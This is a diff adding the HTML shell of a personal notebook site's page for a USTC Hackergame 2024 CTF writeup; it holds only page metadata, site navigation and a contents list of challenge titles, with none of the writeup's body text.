@@ -1,0 +1,2073 @@
+<!DOCTYPE html>
+<html class="no-js" lang="zh">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<link href="https://13m0n4de.vercel.app/writeups/2024/hackergame2024.html" rel="canonical"/>
+<link href="../index.html" rel="prev"/>
+<link href="dicectf2024_quals.html" rel="next"/>
+<link href="../../feed_rss_created.xml" rel="alternate" title="RSS 订阅" type="application/rss+xml"/>
+<link href="../../feed_rss_updated.xml" rel="alternate" title="已更新内容的 RSS 订阅" type="application/rss+xml"/>
+<link href="../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.6.1, mkdocs-material-9.5.47" name="generator"/>
+<title>USTC Hackergame 2024 - 13m0n4de's notebook</title>
+<link href="../../assets/stylesheets/main.6f8fc17f.min.css" rel="stylesheet"/>
+<link href="../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
+<script src="https://unpkg.com/iframe-worker/shim"></script>
+<link href="../../css/toc_extra.css" rel="stylesheet"/>
+<link href="../../css/heti.css" rel="stylesheet"/>
+<link href="../../css/timeline.css" rel="stylesheet"/>
+<link href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-web/style.css" rel="stylesheet"/>
+<link href="https://cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css" rel="stylesheet"/>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css" rel="stylesheet"/>
+<link href="../../stylesheets/custom.css" rel="stylesheet"/>
+<script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+<link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../assets/javascripts/glightbox.min.js"></script></head>
+<body data-md-color-accent="indigo" data-md-color-primary="indigo" data-md-color-scheme="catppuccin-macchiato" dir="ltr">
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#ustc-hackergame-2024">
+          跳转至
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header" data-md-component="header">
+<nav aria-label="页眉" class="md-header__inner md-grid">
+<a aria-label="13m0n4de's notebook" class="md-header__button md-logo" data-md-component="logo" href="../.." title="13m0n4de's notebook">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 7V5h2V4a2 2 0 0 1 2-2h6v7l2.5-1.5L18 9V2h1c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm4 4H5v2h2zm0-4V5H5v2zm0 12v-2H5v2z"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            13m0n4de's notebook
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              USTC Hackergame 2024
+            
+          </span>
+</div>
+</div>
+</div>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="搜索" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="搜索" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+</label>
+<nav aria-label="查找" class="md-search__options">
+<button aria-label="清空当前内容" class="md-search__icon md-icon" tabindex="-1" title="清空当前内容" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+</button>
+</nav>
+<div class="md-search__suggest" data-md-component="search-suggest"></div>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="md-header__source">
+<a class="md-source" data-md-component="source" href="https://github.com/13m0n4de/notebook" title="前往仓库">
+<div class="md-source__icon md-icon">
+<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"></path></svg>
+</div>
+<div class="md-source__repository">
+    13m0n4de/notebook
+  </div>
+</a>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<nav aria-label="标签" class="md-tabs" data-md-component="tabs">
+<div class="md-grid">
+<ul class="md-tabs__list">
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../index.html">
+          
+  
+    
+  
+  Home
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../cs/index.html">
+          
+  
+    
+  
+  Computer Science
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../sec/index.html">
+          
+  
+    
+  
+  Security
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../ctf/index.html">
+          
+  
+    
+  
+  CTF
+
+        </a>
+</li>
+<li class="md-tabs__item md-tabs__item--active">
+<a class="md-tabs__link" href="../index.html">
+          
+  
+    
+  
+  Writeups
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../gamedev/index.html">
+          
+  
+    
+  
+  GameDev
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../blog/index.html">
+          
+  
+    
+  
+  Blog
+
+        </a>
+</li>
+</ul>
+</div>
+</nav>
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="导航栏" class="md-nav md-nav--primary md-nav--lifted" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="13m0n4de's notebook" class="md-nav__button md-logo" data-md-component="logo" href="../.." title="13m0n4de's notebook">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 7V5h2V4a2 2 0 0 1 2-2h6v7l2.5-1.5L18 9V2h1c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm4 4H5v2h2zm0-4V5H5v2zm0 12v-2H5v2z"></path></svg>
+</a>
+    13m0n4de's notebook
+  </label>
+<div class="md-nav__source">
+<a class="md-source" data-md-component="source" href="https://github.com/13m0n4de/notebook" title="前往仓库">
+<div class="md-source__icon md-icon">
+<svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"></path></svg>
+</div>
+<div class="md-source__repository">
+    13m0n4de/notebook
+  </div>
+</a>
+</div>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_1" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../index.html">
+<span class="md-ellipsis">
+    Home
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_1_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_1">
+<span class="md-nav__icon md-icon"></span>
+            Home
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../changelog.html">
+<span class="md-ellipsis">
+    Timeline
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../cs/index.html">
+<span class="md-ellipsis">
+    Computer Science
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_2">
+<span class="md-nav__icon md-icon"></span>
+            Computer Science
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../cs/pl/index.html">
+<span class="md-ellipsis">
+    Programming Language &amp; ISA
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_2_2">
+<span class="md-nav__icon md-icon"></span>
+            Programming Language &amp; ISA
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2_2_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../cs/pl/c/index.html">
+<span class="md-ellipsis">
+    C
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_2_2_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_2_2_2">
+<span class="md-nav__icon md-icon"></span>
+            C
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/pl/python/index.html">
+<span class="md-ellipsis">
+    Python
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/pl/racket/index.html">
+<span class="md-ellipsis">
+    Racket
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/pl/riscv/index.html">
+<span class="md-ellipsis">
+    RISC-V ISA
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/pl/rust/index.html">
+<span class="md-ellipsis">
+    Rust
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../cs/os/index.html">
+<span class="md-ellipsis">
+    Operating System
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_2_3">
+<span class="md-nav__icon md-icon"></span>
+            Operating System
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2_3_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../cs/os/ostep/index.html">
+<span class="md-ellipsis">
+    OSTEP
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2_3_2" id="__nav_2_3_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_3_2_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_2_3_2">
+<span class="md-nav__icon md-icon"></span>
+            OSTEP
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/02introduction.html">
+<span class="md-ellipsis">
+    02.Introduction
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/04processes.html">
+<span class="md-ellipsis">
+    04.Processes
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/05process_api.html">
+<span class="md-ellipsis">
+    05.Process API
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/06direct_execution.html">
+<span class="md-ellipsis">
+    06.Direct Execution
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/07cpu_scheduling.html">
+<span class="md-ellipsis">
+    07.CPU Scheduling
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/08multi_level_feedback.html">
+<span class="md-ellipsis">
+    08.Multi-level Feedback
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/09lottery_scheduling.html">
+<span class="md-ellipsis">
+    09.Lottery Scheduling
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/10multi_cpu_scheduling.html">
+<span class="md-ellipsis">
+    10.Multi-CPU Scheduling
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/13address_spaces.html">
+<span class="md-ellipsis">
+    13.Address Spaces
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/14memory_api.html">
+<span class="md-ellipsis">
+    14.Memory API
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/15address_translation.html">
+<span class="md-ellipsis">
+    15.Address Translation
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/16segmentation.html">
+<span class="md-ellipsis">
+    16.Segmentation
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/17free_space_management.html">
+<span class="md-ellipsis">
+    17.Free Space Management
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/18introduction_to_paging.html">
+<span class="md-ellipsis">
+    18.Introduction to Paging
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/19translation_lookaside_buffers.html">
+<span class="md-ellipsis">
+    19.Translation Lookaside Buffers
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/ostep/20advanced_page_tables.html">
+<span class="md-ellipsis">
+    20.Advanced Page Tables
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../cs/os/mit6.1810.html">
+<span class="md-ellipsis">
+    MIT 6.1810
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2_3_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../cs/os/rcore/index.html">
+<span class="md-ellipsis">
+    rCore
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_3_4_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_2_3_4">
+<span class="md-nav__icon md-icon"></span>
+            rCore
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../cs/compiler/index.html">
+<span class="md-ellipsis">
+    Compiler
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_4_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_2_4">
+<span class="md-nav__icon md-icon"></span>
+            Compiler
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../sec/index.html">
+<span class="md-ellipsis">
+    Security
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_3">
+<span class="md-nav__icon md-icon"></span>
+            Security
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_3_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+<span class="md-ellipsis">
+    漏洞分析与复现
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_3_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_3_2">
+<span class="md-nav__icon md-icon"></span>
+            漏洞分析与复现
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_3_2_1" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../sec/vulns/pngcheck/index.html">
+<span class="md-ellipsis">
+    pngcheck
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_3_2_1_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_3_2_1">
+<span class="md-nav__icon md-icon"></span>
+            pngcheck
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../sec/vulns/pngcheck/vulns-3.0.1.html">
+<span class="md-ellipsis">
+    vulns-3.0.1
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../sec/vulns/pngcheck/vulns-3.0.0.html">
+<span class="md-ellipsis">
+    vulns-3.0.0
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../sec/vulns/pngcheck/vulns-2.4.0.html">
+<span class="md-ellipsis">
+    vulns-2.4.0
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../sec/vulns/pngcheck/cve-2020-35511.html">
+<span class="md-ellipsis">
+    CVE-2020-35511
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../sec/vulns/pngcheck/cve-2020-27818.html">
+<span class="md-ellipsis">
+    CVE-2020-27818
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../ctf/index.html">
+<span class="md-ellipsis">
+    CTF
+  </span>
+</a>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_4">
+<span class="md-nav__icon md-icon"></span>
+            CTF
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../index.html">
+<span class="md-ellipsis">
+    Writeups
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="true" aria-labelledby="__nav_5_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_5">
+<span class="md-nav__icon md-icon"></span>
+            Writeups
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--active md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_5_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+<span class="md-ellipsis">
+    2024
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_5_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_5_2">
+<span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+    USTC Hackergame 2024
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="hackergame2024.html">
+<span class="md-ellipsis">
+    USTC Hackergame 2024
+  </span>
+</a>
+<nav aria-label="目录" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web">
+<span class="md-ellipsis">
+            [Web] 签到
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web-ctfer">
+<span class="md-ellipsis">
+            [Web] 喜欢做签到的 CTFer 你们好呀
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[Web] 喜欢做签到的 CTFer 你们好呀" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general-hackergame">
+<span class="md-ellipsis">
+            [General] 猫咪问答（Hackergame 十周年纪念版）
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] 猫咪问答（Hackergame 十周年纪念版）" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general">
+<span class="md-ellipsis">
+            [General] 打不开的盒
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general_1">
+<span class="md-ellipsis">
+            [General] 每日论文太多了！
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web_1">
+<span class="md-ellipsis">
+            [Web] 比大小王
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[Web] 比大小王" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general-40">
+<span class="md-ellipsis">
+            [General] 旅行照片 4.0
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] 旅行照片 4.0" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general_2">
+<span class="md-ellipsis">
+            [General] 不宽的宽字符
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] 不宽的宽字符" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#general-powerfulshell">
+<span class="md-ellipsis">
+            [General] PowerfulShell
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[General] PowerfulShell" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web-nodejs-is-web-scale">
+<span class="md-ellipsis">
+            [Web] Node.js is Web Scale
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#web-paolugpt">
+<span class="md-ellipsis">
+            [Web] PaoluGPT
+        </span>
+</a>
+<!-- Table of contents list -->
+<nav aria-label="[Web] PaoluGPT" class="md-nav">
+<ul class="md-nav__list">
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#other">
+<span class="md-ellipsis">
+            Other...
+        </span>
+</a>
+<!-- Table of contents list -->
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="dicectf2024_quals.html">
+<span class="md-ellipsis">
+    DiceCTF 2024 Quals
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="svuctf_spring_2024.html">
+<span class="md-ellipsis">
+    SVUCTF SPRING 2024
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../gamedev/index.html">
+<span class="md-ellipsis">
+    GameDev
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_6">
